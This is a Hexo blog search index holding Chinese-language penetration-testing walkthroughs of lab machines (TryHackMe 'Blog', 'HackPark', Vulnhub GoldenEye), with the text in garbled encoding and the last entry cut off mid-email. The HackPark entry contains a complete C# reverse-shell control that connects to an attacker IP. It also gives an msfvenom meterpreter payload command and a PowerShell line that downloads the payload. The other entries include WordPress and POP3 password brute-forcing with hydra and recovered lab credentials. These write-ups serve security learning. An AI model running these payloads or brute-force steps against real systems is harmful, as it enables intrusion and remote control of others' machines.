<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Blog</title>
      <link href="/2024/07/30/Blog/"/>
      <url>/2024/07/30/Blog/</url>
      
        <content type="html"><![CDATA[<h1 id="å…¥ä¾µ"><a href="#å…¥ä¾µ" class="headerlink" title="å…¥ä¾µ"></a>å…¥ä¾µ</h1><p>ğŸ‘ï¼Œè¿™ä¸ªç½‘ç«™å¤šåŠæ˜¯ billy çš„<br><img src="/Red_FILE/1d61294e726a3a67195cb61816eb5865_MD5.jpeg"></p><p>CMSæ˜¯WordPress 5.0 ï¼Œè¿›å…¥åå°<br><img src="/Red_FILE/84213a721aef84f5c5ed6bb587b26211_MD5.jpeg"><img src="/Red_FILE/f3c123c9f3ce17dcc02699dfbcf09f04_MD5.jpeg"></p><p>wpscanï¼Œæ¢æµ‹ä¸‹ç”¨æˆ·å</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[i] User(s) Identified:[+] kwheel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] bjoel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] Karen Wheeler | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection)[+] Billy Joel | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•åå¾—åˆ°ç”¨æˆ·åæ˜¯è¿™ä¸‰ä¸ª<br><img src="/Red_FILE/c30867a18e36c4eff754997a14778726_MD5.jpeg"><br><img src="/Red_FILE/0b66ea0f5173c245478fe12918496711_MD5.jpeg"></p><p>çˆ†ç ´æ‹¿åˆ°åå°ç™»å½•è´¦å¯† <code>kwheel:cutiepie1</code><br><img src="/Red_FILE/4620bdb86e1af572400c35f6f347a7e4_MD5.jpeg"></p><p>è¿™æ˜¯ä¸ªä½æƒé™è´¦æˆ·ï¼Œä¸èƒ½ä¿®æ”¹plugin<br><img src="/Red_FILE/0e37a1a4e0adac8cbdb9d5c2bc9350bd_MD5.jpeg"></p><p>æŸ¥ä¸‹CVE<br><img src="/Red_FILE/efe290015f01c53c3ba1e4ac00bdfe15_MD5.jpeg"><br>åˆ©ç”¨cropæ‹¿åˆ°webshell<br><img src="/Red_FILE/24a7fd30575a27d717b0e46742e06476_MD5.jpeg"></p><p>åˆ©ç”¨pythonå¯ä¸€ä¸ªä¼ªç»ˆç«¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/sh") '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Red_FILE/81302b3f512643e03bbd9bffeb77c611_MD5.jpeg"></p><p>æ‹¿åˆ°äº†ä¸€ä¸ªä½æƒé™ç”¨æˆ·ï¼ŒWordPress CMS ç½‘ç«™çš„æ•°æ®åº“å¯†ç å†™åœ¨ <code>wp-config.php</code>æ–‡ä»¶ä¸‹<br><img src="/Red_FILE/083a38047264ae10b39c0afa2131cd4c_MD5.jpeg"></p><p>æ•°æ®åº“åä¸º <code>blog</code>ï¼Œè´¦å¯† <code>wordpressuser:LittleYellowLamp90!@</code><br><img src="/Red_FILE/c3e090d238672ab7f8cdaee7cbbd3689_MD5.jpeg"><br><img src="/Red_FILE/f29c6103b55ed8858b560e23d9933aec_MD5.jpeg"></p><p>å°è¯•å»çˆ†ä¸‹hashï¼Œä½†æ˜¯åŠå¤©æ²¡çˆ†å‡ºæ¥</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">bjoel | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/kwheel | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><p>æ”¾ä¸€ä¸ª lineas.sh ä¸Šå»</p><p>ubuntu18.04ï¼Œå½“ç„¶å†…æ ¸ææƒä¸€èˆ¬ä¸è½»æ˜“ä½¿ç”¨ï¼Œå‘ç°äº†ä¸€ä¸ªsuidçš„å¥‡æ€ªäºŒè¿›åˆ¶æ–‡ä»¶<br><img src="/Red_FILE/32645f948cfe52fd2eb4c93642cb9b9b_MD5.jpeg"></p><p>Not an Adminï¼Ÿ<br><img src="/Red_FILE/c99796ccc62869ee5673aad0af13cd62_MD5.jpeg"></p><p>é€†å‘åˆ†æä¸€ä¸‹<br><img src="/Red_FILE/14c674c48c9d9903534a332d84652753_MD5.jpeg"><br>å°±æ˜¯è·å–adminçš„ç¯å¢ƒå˜é‡ï¼Œéç©ºæ‰§è¡Œsetuid<br><img src="/Red_FILE/86c57f046503d1cebbbcae07e443c194_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æ‰“é¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackPark</title>
      <link href="/2024/07/18/HackPark/"/>
      <url>/2024/07/18/HackPark/</url>
      
        <content type="html"><![CDATA[<h1 id="å…¥ä¾µ"><a href="#å…¥ä¾µ" class="headerlink" title="å…¥ä¾µ"></a>å…¥ä¾µ</h1><p><img src="/Red_FILE/48b909034099d6a6ef9a4f80719bf65d_MD5.jpeg"></p><p>åªå¼€äº†80å’Œ3389ç«¯å£</p><p>ä¸€ä¸ªç™»å½•ç•Œé¢<br><img src="/Red_FILE/192635cd562ac8547a8652c5429e2237_MD5.jpeg"><br>çˆ†ä¸€ä¸‹å¼±å£ä»¤ï¼Œè¿æ°”ä¸é”™~ï¼š<code>admin:1qaz2wsx</code><br><img src="/Red_FILE/9d2e663b0406290262abb4905b2d1fa7_MD5.jpeg"></p><p>ç™»å½•åå°ï¼Œä½¿ç”¨çš„æ¡†æ¶æ˜¯ BlogEngine.NET 3.3.6.0<br><img src="/Red_FILE/cdfa836ce2695885b360eef7e0afac0d_MD5.jpeg"></p><p>searchsploit æœ‰å†å²CVEï¼ŒCVE-2019-6714<br><img src="/Red_FILE/e3d669d666d559346ec7757c4a84c9cf_MD5.jpeg"></p><p>msfå¹¶æ²¡æœ‰è‡ªåŠ¨åˆ©ç”¨çš„è„šæœ¬ï¼Œç›´æ¥æ‰‹æ’¸å§ï¼Œæ¼æ´ç‚¹åœ¨ theme æ¨¡å—ã€‚åœ¨æ–‡ç« å‘å¸ƒé¡µé¢ ï¼ˆ&#x2F;admin&#x2F;app&#x2F;editor&#x2F;editpost.cshtmlï¼‰ å¯ä»¥ä¸Šä¼ ä¸€ä¸ª PostView.ascx æ ¼å¼çš„ webshellï¼Œç„¶åè®¿é—® &#x2F;?theme&#x3D;..&#x2F;..&#x2F;App_Data&#x2F;files æ¿€æ´»<br><img src="/Red_FILE/69f3f8074d78ffb7b88bb8d76d0ce2a8_MD5.jpeg"><br><img src="/Red_FILE/536ccdfbaa739cda90c35da8dbc1e852_MD5.jpeg"></p><pre class="line-numbers language-csharp" data-language="csharp"><div class="caption"><span>TI:"PostView.ascx"</span></div><code class="language-csharp"><span class="token operator">&lt;</span><span class="token operator">%</span>@ <span class="token class-name">Control</span> Language<span class="token operator">=</span><span class="token string">"C#"</span> AutoEventWireup<span class="token operator">=</span><span class="token string">"true"</span> EnableViewState<span class="token operator">=</span><span class="token string">"false"</span> Inherits<span class="token operator">=</span><span class="token string">"BlogEngine.Core.Web.Controls.PostViewBase"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ <span class="token class-name">Import</span> Namespace<span class="token operator">=</span><span class="token string">"BlogEngine.Core"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token class-name">script</span> runat<span class="token operator">=</span><span class="token string">"server"</span><span class="token operator">></span><span class="token keyword">static</span> <span class="token class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamWriter</span> streamWriter<span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">override</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">OnLoad</span><span class="token punctuation">(</span><span class="token class-name">EventArgs</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">OnLoad</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient</span><span class="token punctuation">(</span><span class="token string">"10.11.84.153"</span><span class="token punctuation">,</span> <span class="token number">4445</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>Stream</span> stream <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">GetStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamReader</span> rdr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamReader</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>streamWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamWriter</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StringBuilder</span> strInput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">"cmd.exe"</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>CreateNoWindow <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardInput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardError <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>OutputDataReceived <span class="token operator">+=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>DataReceivedEventHandler</span><span class="token punctuation">(</span>CmdOutputDataHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">BeginOutputReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>strInput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>rdr<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StandardInput<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strInput<span class="token punctuation">)</span><span class="token punctuation">;</span>strInput<span class="token punctuation">.</span><span class="token function">Remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> strInput<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">CmdOutputDataHandler</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sendingProcess<span class="token punctuation">,</span> <span class="token class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>DataReceivedEventArgs</span> outLine<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">StringBuilder</span> strOutput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>String<span class="token punctuation">.</span><span class="token function">IsNullOrEmpty</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                strOutput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>                    streamWriter<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strOutput<span class="token punctuation">)</span><span class="token punctuation">;</span>                    streamWriter<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>asp<span class="token punctuation">:</span><span class="token class-name">PlaceHolder</span> ID<span class="token operator">=</span><span class="token string">"phContent"</span> runat<span class="token operator">=</span><span class="token string">"server"</span> EnableViewState<span class="token operator">=</span><span class="token string">"false"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>asp<span class="token punctuation">:</span>PlaceHolder<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸåå¼¹shell<br><img src="/Red_FILE/7e2075335b9e6db1f1de19824553a7e1_MD5.jpeg"></p><p>x64 çš„ win server 2012<br><img src="/Red_FILE/f265b6ae28e465c4f6af68e04120b9a3_MD5.jpeg"></p><p>æˆ‘ä»¬å¤„åœ¨system32&#x2F;ç›®å½•ï¼Œæ²¡æœ‰æƒé™ã€‚åˆ‡æ¢ç›®å½•åç…§ä¾‹æŠŠshelläº¤ç»™msfæ¥ç®¡</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token parameter variable">-a</span> x64 <span class="token parameter variable">--encoder</span> x64/shikata_ga_nai <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.11</span>.84.153 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> ma.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token operator">-</span>c <span class="token string">"(New-Object System.Net.WebClient).Downloadfile('http://10.11.84.153:8888/ma.exe', 'ma.exe')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ‘é€‰æ‹©å°†shellè¿ç§»åˆ°w3wp.exe</p><h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>ä½¿ç”¨ Windows-Exploit-Suggester ï¼Œå¯¼å…¥systeminfoä¿¡æ¯</p><p>å‘ç°å…¶å—åˆ° ms16_075 policypotatoææƒ çš„å½±å“<br><img src="/Red_FILE/d4be9fc1823cbd0670ca50e94af0fac7_MD5.jpeg"></p><p>ç›´æ¥msfä¸€æŠŠæ¢­<br><img src="/Red_FILE/2cca4ced89e25e4f75de01b5fb51c1c1_MD5.jpeg"></p><p>æˆ–è€…ç”¨winpeas<br><img src="/Red_FILE/90545071eaf01e132b80ec33191a8276_MD5.jpeg"><br>æ›¿æ¢æœåŠ¡æ–‡ä»¶ä¹Ÿå¯ä»¥æ‹¿åˆ°SYSTEM</p>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æ‰“é¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-GOLDENEYES</title>
      <link href="/2024/07/17/Vulnhub-GOLDENEYE/"/>
      <url>/2024/07/17/Vulnhub-GOLDENEYE/</url>
      
        <content type="html"><![CDATA[<h1 id="å…¥ä¾µ"><a href="#å…¥ä¾µ" class="headerlink" title="å…¥ä¾µ"></a>å…¥ä¾µ</h1><blockquote><p>é¶æœºä¸‹è½½åœ°å€ï¼š<a href="https://www.vulnhub.com/entry/goldeneye-1,240/#networking">é»„é‡‘çœ¼ï¼š1 ~ VulnHub â€” GoldenEye: 1 ~ VulnHub</a></p></blockquote><p>æ¢æµ‹åˆ°é¶æœºip<br><img src="/Red_FILE/764c1b125b1d468c2d09ab81eb511066_MD5.jpeg"></p><p>å…ˆæ‰«æ‰«ç«¯å£å­<br>å¼€äº†25ã€80ç«¯å£</p><p><img src="/Red_FILE/3a9ad0529e3fc6a10d84a32a837ee647_MD5.jpeg"><br>æç¤ºåœ¨&#x2F;sev-home&#x2F;ç™»å½•<br><img src="/Red_FILE/41cadb50e3c6efa9fba59d2787a8703c_MD5.jpeg"><br>ç®€å•è¯•äº†å‡ ä¸ªå¼±å£ä»¤ï¼Œæ²¡è¿›å»</p><p>ç›®å½•ä¹Ÿæ²¡æ‰«å‡ºä»€ä¹ˆ</p><p>æ³¨æ„åˆ°è¿™æ˜¯admin serverï¼Œå°è¯•çˆ†ä¸‹å¯†ç <br><img src="/Red_FILE/6110e77c5cc8b3d1b995dc93338c9bdf_MD5.jpeg"><br>ä½†æ˜¯åœ¨æŠ“åŒ…æ—¶å‘ç°å¹¶æ²¡æœ‰ä¼ å‚ï¼Œç¦»è°±ï¼Œéš¾é“æ˜¯å‰ç«¯éªŒè¯ï¼Ÿ</p><p>å»çœ‹çœ‹æºä»£ç ï¼Œåœ¨ terminal.js è¿˜çœŸæœ‰ä¸€æ®µæ³¨é‡Šçš„ä¿¡æ¯ï¼š<br><img src="/Red_FILE/6d93258b7be2181235450c1cd30145ef_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">////Boris, make sure you update your default password. //My sources say MI6 maybe planning to infiltrate. //Be on the lookout for any suspicious network traffic....////I encoded you p@ssword below...////&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;////BTW Natalya says she can break your codes//<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯è§è¿™ä¸ªserverçš„ç”¨æˆ·åå¾ˆå¯èƒ½æ˜¯Borisï¼Œå¯†ç ä¸€çœ¼asciiã€‚è§£ç å¾—åˆ°ï¼š<code>InvincibleHack3r</code></p><p>å°è¯•åå¾—åˆ°è´¦å¯†ä¸º<code>boris:InvincibleHack3r</code>ï¼Œç™»å½•æˆåŠŸ<br><img src="/Red_FILE/f17f9ff3b6899d8c65509394e1c871f2_MD5.jpeg"></p><p>å†æ‰«ä¸€ä¸‹ç›®å½•ï¼Œè¿˜æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰</p><p>çœ‹ä¸€ä¸‹æºç <br><img src="/Red_FILE/fd38b4be7bf1e602108cead199afa81c_MD5.jpeg"><br>çŸ¥é“äº†GoldenEye ç½‘ç»œè¿è¥å•†ä¸»ç®¡æ˜¯ <code>Natalyaã€Boris</code></p><p>è¿™æ—¶æˆ‘ç•™æ„åˆ°ä¸»é¡µä¸Šçš„è‹±æ–‡ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">GoldenEye æ˜¯è‹è”çš„ä¸€é¡¹ç»å¯†æ­¦å™¨é¡¹ç›®ã€‚æ—¢ç„¶æ‚¨æœ‰è®¿é—®æƒé™ï¼Œé‚£ä¹ˆæ‚¨è‚¯å®šæ‹¥æœ‰ç»å¯†è®¸å¯ï¼Œæœ‰èµ„æ ¼æˆä¸ºç»è¿‡è®¤è¯çš„ GoldenEye ç½‘ç»œè¿è¥å•† (GNO)è¯·å‘åˆæ ¼çš„ GNO ä¸»ç®¡å‘é€ç”µå­é‚®ä»¶ï¼Œæ¥å—åœ¨çº¿ GoldenEye è¿è¥å•†åŸ¹è®­ï¼Œæˆä¸º GoldenEye ç³»ç»Ÿçš„ç®¡ç†å‘˜è¯·è®°ä½ï¼Œç”±äºéšè”½æ€§å®‰å…¨éå¸¸æœ‰æ•ˆï¼Œæˆ‘ä»¬å·²å°† pop3 æœåŠ¡é…ç½®ä¸ºåœ¨éå¸¸é«˜çš„éé»˜è®¤ç«¯å£ä¸Šè¿è¡Œ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿›è¡Œä¸€æ¬¡å…¨ç«¯å£æ‰«æï¼Œè¿™é‡Œæˆ‘ç”¨ goby å¿«ä¸€ç‚¹<br><img src="/Red_FILE/17357c7a5309180fe69ce58d3a8b147f_MD5.jpeg"></p><p>åœ¨ 55007 å‘ç°äº†POP3ç«¯å£<br><img src="/Red_FILE/5e31833d3ac66b27763cc45eaf4d5c06_MD5.jpeg"></p><p>è¿™æ—¶æˆ‘æƒ³åˆ°å‰é¢çš„ä¸€å¥è¯</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Boris, make sure you update your default password. Borisï¼Œç¡®ä¿ä½ æ›´æ–°äº†ä½ çš„é»˜è®¤å¯†ç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç”¨æˆ·åå¾ˆå¯èƒ½è¿˜æ˜¯ boris ï¼Œç”¨ hydra + rockyou çˆ†ä¸‹å¼±å£ä»¤</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-s</span> <span class="token number">55007</span> <span class="token parameter variable">-l</span> <span class="token string">"boris"</span> <span class="token parameter variable">-P</span> <span class="token string">"C:\Program Files\TOOLS\å¯†ç å­—å…¸\PasswordDic\å¼±å£ä»¤å­—å…¸<span class="token entity" title="\r">\r</span>ockyou-top15000.txt"</span> <span class="token parameter variable">-e</span> nsr <span class="token parameter variable">-t</span> <span class="token number">5</span> <span class="token number">192.168</span>.50.136 pop3 <span class="token parameter variable">-vV</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çˆ†å‡ºå¯†ç <code>boris:secret1!</code></p><p>ç™»å½•pop3é‚®ä»¶ç³»ç»Ÿï¼Œçœ‹åˆ°æœ‰ä¸‰å°é‚®ä»¶<br><img src="/Red_FILE/4b97f97c8f9cdd65af8bf5e88b3b784a_MD5.jpeg"><br>è¿™ä¸‰å°é‚®ä»¶ä¿¡æ¯åˆ†åˆ«å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;root@127.0.0.1.goldeneye>X-Original-To: borisDelivered-To: boris@ubuntuReceived: from ok (localhost [127.0.0.1])        by ubuntu (Postfix) with SMTP id D9E47454B1        for &lt;boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)Message-Id: &lt;20180425022326.D9E47454B1@ubuntu>Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)From: root@127.0.0.1.goldeneyeBoris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.é²é‡Œæ–¯ï¼Œæˆ‘æ˜¯ç®¡ç†å‘˜ã€‚æ‚¨å¯ä»¥åœ¨è¿™é‡Œä¸åŒäº‹å’Œå­¦ç”Ÿè¿›è¡Œç”µå­äº¤æµã€‚æˆ‘ä¸ä¼šæ‰«æç”µå­é‚®ä»¶ä»¥æŸ¥æ‰¾å®‰å…¨é£é™©ï¼Œå› ä¸ºæˆ‘ä¿¡ä»»æ‚¨å’Œè¿™é‡Œçš„å…¶ä»–ç®¡ç†å‘˜ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;natalya@ubuntu>X-Original-To: borisDelivered-To: boris@ubuntuReceived: from ok (localhost [127.0.0.1])        by ubuntu (Postfix) with ESMTP id C3F2B454B1        for &lt;boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu>Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)From: natalya@ubuntuBoris, I can break your codes!é²é‡Œæ–¯ï¼Œæˆ‘å¯ä»¥ç ´è§£ä½ çš„å¯†ç ï¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;alec@janus.boss>X-Original-To: borisDelivered-To: boris@ubuntuReceived: from janus (localhost [127.0.0.1])        by ubuntu (Postfix) with ESMTP id 4B9F4454B1        for &lt;boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu>Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)From: alec@janus.bossBoris,Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....PS - Keep security tight or we will be compromised.é²é‡Œæ–¯ï¼Œæ‚¨ä¸æˆ‘ä»¬é›†å›¢çš„åˆä½œå°†å¸¦æ¥ä¸°åšçš„å›æŠ¥ã€‚é™„ä»¶æ˜¯ GoldenEye çš„æœ€ç»ˆè®¿é—®ä»£ç ã€‚å°†å®ƒä»¬æ”¾åœ¨æ­¤æœåŠ¡å™¨æ ¹ç›®å½•ä¸­çš„éšè—æ–‡ä»¶ä¸­ï¼Œç„¶åä»æ­¤ç”µå­é‚®ä»¶ä¸­åˆ é™¤ã€‚è¿™äº›è®¿é—®ä»£ç åªèƒ½æœ‰ä¸€ç»„ï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿å®ƒä»¬å®‰å…¨æ‰èƒ½æœ€ç»ˆæ‰§è¡Œã€‚å¦‚æœå®ƒä»¬è¢«æ£€ç´¢å’Œæ•è·ï¼Œæˆ‘ä»¬çš„è®¡åˆ’å°†å´©æºƒï¼ä¸€æ—¦ Xenia è·å¾—è®­ç»ƒç«™ç‚¹çš„è®¿é—®æƒé™å¹¶ç†Ÿæ‚‰ GoldenEye ç»ˆç«¯ä»£ç 